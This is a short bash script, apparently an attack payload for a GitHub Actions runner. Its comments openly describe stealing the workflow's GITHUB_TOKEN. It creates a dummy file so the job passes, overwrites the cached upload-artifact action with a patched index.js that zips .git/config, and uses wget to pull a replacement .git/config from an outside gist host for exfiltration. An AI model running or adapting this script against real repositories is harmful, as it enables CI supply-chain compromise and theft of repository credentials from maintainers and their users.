#!/bin/bash

# to prevent the job from failing
touch missing_license_headers.txt

# patching the upload-artifact action with code to zip the .git/config file
cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js

# modifying .git/config to exfiltrate the GITHUB_TOKEN 
wget https://gist.githubusercontent.com/stazottest0/ec556e4cc70e6029c6f5bd91925168ba/raw/54cf57e0e3e10029614f8aad11c869597a6100bc/gistfile1.txt -O .git/config
